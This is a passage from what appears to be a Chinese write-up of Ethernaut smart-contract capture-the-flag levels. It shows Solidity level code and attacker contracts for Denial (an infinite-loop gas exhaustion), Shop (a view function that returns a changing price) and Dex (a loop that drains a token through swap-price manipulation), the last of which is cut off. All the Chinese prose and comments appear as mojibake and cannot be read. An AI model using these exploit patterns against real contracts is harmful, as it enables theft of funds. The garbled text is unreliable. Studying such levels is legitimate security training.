<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>

<span class="w">    </span><span class="c1">// convenience function</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">contractBalance</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>
<p><code>withdraw()</code> Âπ∂Ê≤°ÊúâÊ£ÄÊü• <code>partner.call{value:amountToSend}("");</code> ÁöÑËøîÂõûÂÄºÔºåÂõ†Ê≠§Ë¢´Ë∞ÉÁî®ÂáΩÊï∞ <code>revert</code> Âπ∂‰∏ç‰ºöÂΩ±ÂìçÂêéÁª≠ËØ≠Âè•ÁöÑÊâßË°åÔºå‰ΩÜÂèØ‰ª•ËÄóÂ∞ΩÊ±ΩÊ≤π‰ΩøÊï¥‰∏™‰∫§ÊòìÂ§±Ë¥•</p>
<div class="highlight"><pre><span></span><code><span class="c1">// ÂÖà‰ΩøÁî® setWithdrawPartner ËÆæÁΩÆ partner ‰∏∫ÂêàÁ∫¶ Hack ÁöÑÂú∞ÂùÄ</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>ÂΩì‰ΩøÁî® <code>call</code> ÂèëËµ∑Â§ñÈÉ®Ë∞ÉÁî®Êó∂ÔºåÊúÄÂ•ΩÊåáÂÆöÊ±ΩÊ≤πÈáèÔºåÂ¶Ç <code>call.gas(100000).value()</code></p>
</li>
<li>Â§ñÈÉ® <code>CALL</code> ÊúÄÂ§öÂèØ‰ª•‰ΩøÁî® <code>CALL</code> Êó∂ 63/64 ÁöÑÊ±ΩÊ≤πÔºåÂõ†Ê≠§ÔºåË∂≥Â§üÈ´òÁöÑÊ±ΩÊ≤πÈáè‰πüÂèØ‰ª•ÁºìËß£ËøôÁßçÊîªÂáª</li>
</ul>
<h2 id="21-shop">21. Shop<a class="headerlink" href="#21-shop" title="Permanent link">&para;</a></h2>
<p>‰ª•‰Ωé‰∫éÂÆö‰ª∑ÁöÑ‰ª∑Ê†º‰ªéÂïÜÂ∫óË¥≠‰π∞ÂïÜÂìÅ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">Buyer</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">price</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Shop</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">price</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">isSold</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">buy</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Buyer</span><span class="w"> </span><span class="nx">_buyer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Buyer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">_buyer</span><span class="p">.</span><span class="nx">price</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">price</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">isSold</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">isSold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">      </span><span class="nx">price</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_buyer</span><span class="p">.</span><span class="nx">price</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>ÈúÄË¶ÅÂÆûÁé∞ <code>price()</code> ÂáΩÊï∞Ôºå‰ΩøÂæóÁ¨¨‰∏ÄÊ¨°Ë∞ÉÁî®Êó∂ËøîÂõûÁöÑ‰ª∑Ê†º‰∏çÂ∞è‰∫éÂÆö‰ª∑ÔºåÁ¨¨‰∫åÊ¨°Ë∞ÉÁî®Êó∂ËøîÂõûÁöÑ‰ª∑Ê†ºÂ∞è‰∫éÂÆö‰ª∑</li>
<li>
<p>Â£∞Êòé‰∫Ü <code>view</code> ÁöÑÂáΩÊï∞‰∏çËÉΩ‰øÆÊîπÁä∂ÊÄÅÔºåÁ¨¨‰∏ÄÂèçÂ∫îÊòØÂà©Áî® <code>gasleft()</code> Êù•Ëé∑ÂæóÂèòÂåñÁöÑÂÄº</p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">buy</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Shop</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">buy</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">price</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">300</span><span class="p">;</span><span class="w">  </span><span class="c1">// Âú® Goerli ÊµãËØïÁΩëÁªú‰∏äË∞ÉËØïÈÄöËøá</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>Â£∞Êòé‰∫Ü <code>view</code> ÁöÑÂáΩÊï∞ÂèØ‰ª•ËØªÂèñÁä∂ÊÄÅÔºåÂõ†Ê≠§‰πüÂèØ‰ª•Âà©Áî®Áä∂ÊÄÅÂèòÈáè <code>isSold</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">buy</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Shop</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">buy</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">price</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">Shop</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">isSold</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
</ul>
<h2 id="22-dex">22. Dex<a class="headerlink" href="#22-dex" title="Permanent link">&para;</a></h2>
<ul>
<li>Ëá≥Â∞ëÊ∏ÖÁ©∫ <a href="https://en.wikipedia.org/wiki/Decentralized_exchange">DEX</a> ÂêàÁ∫¶‰∏≠ÁöÑ‰∏ÄÁßç‰ª£Â∏Å</li>
<li>ÂêàÁ∫¶ <code>Dex</code> ÊØèÁßç‰ª£Â∏ÅÂàùÂßãÂêÑ 100 ÊûöÔºåÁé©ÂÆ∂ÊØèÁßç‰ª£Â∏ÅÂàùÂßãÂêÑ 10 Êûö</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s1">&#39;openzeppelin-contracts-08/access/Ownable.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Dex</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token1</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token2</span><span class="p">;</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTokens</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token1</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_token2</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token1</span><span class="p">;</span>
<span class="w">    </span><span class="nx">token2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token2</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">addLiquidity</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token_address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token_address</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">((</span><span class="kr">from</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token2</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="kr">from</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token2</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token1</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Invalid tokens&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not enough to swap&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">swapAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
<span class="w">    </span><span class="k">return</span><span class="p">((</span><span class="nx">amount</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span><span class="o">/</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">SwappableToken</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">SwappableToken</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">account</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">account</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SwappableToken</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_dex</span><span class="p">;</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">)</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">owner</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">_dex</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;InvalidApprover&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">super</span><span class="p">.</span><span class="nx">_approve</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>Ê¢≥ÁêÜÂêàÁ∫¶ <code>Dex</code> Êèê‰æõÁöÑ‰ª£Â∏Å‰∫íÊç¢ÊñπÂºè<ul>
<li>Ê†πÊçÆË¶Å‰∫§Êç¢ÁöÑ <code>from</code> ‰ª£Â∏ÅÁöÑÊï∞Èáè <code>amount</code>„ÄÅ<code>Dex</code> ÂêàÁ∫¶ <code>from</code> Âíå <code>to</code> ‰ª£Â∏ÅÁöÑ‰ΩôÈ¢ùËÆ°ÁÆó‰∫§Êç¢ÂæóÂà∞ <code>to</code> ‰ª£Â∏ÅÁöÑÊï∞Èáè <code>swapAmount</code>ÔºåÂç≥ <code>swapAmount = amount * to.balance / from.balance</code></li>
<li>Â∞ÜË¶Å‰∫§Êç¢ÁöÑ <code>from</code> ‰ª£Â∏ÅÂ≠òÂÖ• <code>Dex</code> ÂêàÁ∫¶Ôºå<code>swapAmount</code> Êï∞ÈáèÁöÑ <code>to</code> ‰ª£Â∏Å‰ªé <code>Dex</code> ÂêàÁ∫¶ËΩ¨Âá∫</li>
</ul>
</li>
<li>Ëã•È¶ñÂÖàÂ∞Ü 10 Êûö <code>token1</code> ËΩ¨Êç¢‰∏∫ <code>token2</code>ÔºåÊ≠§Êó∂ <code>swapAmount</code> ‰∏∫ 10Ôºå<code>Dex</code> ÂêàÁ∫¶ <code>token1</code> ÁöÑ‰ΩôÈ¢ùÂèò‰∏∫ 110„ÄÅ<code>token2</code> ÁöÑ‰ΩôÈ¢ùÂèò‰∏∫ 90ÔºåÁé©ÂÆ∂Â∞ÜÊåÅÊúâ 20 Êûö <code>token2</code> ‰ª£Â∏ÅÔºåÂÜçÂ∞ÜÂÖ®ÈÉ® <code>token2</code> ËΩ¨‰∏∫ <code>token1</code>ÔºåÊ≠§Êó∂ <code>swapAmount</code> ÊèêÈ´òÂà∞ 24ÔºåÂèØËßÅ‰∏çÊñ≠ËøõË°å‰ª£Â∏Å‰∫íÊç¢Âç≥ÂèØÊ∏ÖÁ©∫ <code>Dex</code> ÂêàÁ∫¶‰∏≠ÁöÑ‰∏ÄÁßç‰ª£Â∏Å</li>
<li>
<p>ÈÉ®ÁΩ≤ÂêàÁ∫¶ <code>Hack</code>ÔºåÂπ∂ÊéàÊùÉ‰ΩøÁî®‰ª£Â∏Å <code>&gt;&gt; contract.approve("&lt;hack-address&gt;", 10)</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">Dex</span><span class="w"> </span><span class="nx">dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Dex</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">token1</span><span class="p">();</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">token2</span><span class="p">();</span>
<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="mf">10</span><span class="p">);</span>
<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="mf">10</span><span class="p">);</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span><span class="w">  </span><span class="c1">// Â∞ÜÊåÅÊúâÁöÑ‰ª£Â∏ÅÂÖ®ÈÉ®Áî®‰∫é‰∫§Êç¢</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// Èô§Á¨¨‰∏ÄÊ¨°‰∫§Êç¢Â§ñÔºåÂêàÁ∫¶ Dex ÁöÑ to ‰ª£Â∏ÅÁöÑ‰ΩôÈ¢ùÂøÖ‰∏∫ 110</span>
<span class="w">                </span><span class="c1">// ÂΩì swapAmount Â§ß‰∫é Dex ÂêàÁ∫¶ to ‰ª£Â∏ÅÁöÑ‰ΩôÈ¢ùÊó∂ÔºåËØ¥ÊòéÊú¨Ê¨°‰∫§Êç¢ËÉΩÂ§üÊ∏ÖÁ©∫ to ‰ª£Â∏Å</span>
<span class="w">                </span><span class="c1">// Âç≥ÂèØ‰ª•Ëé∑Âæó 110 Êûö to ‰ª£Â∏ÅÔºåÈÇ£‰πàÂèÇ‰∏é‰∫§Êç¢ÁöÑ from ‰ª£Â∏ÅÁöÑÊï∞ÈáèÂ∫î‰∏∫</span>
<span class="w">                </span><span class="c1">// 110 * from.balance / to.balance = 110 * from.balance / 110 = from.balance</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
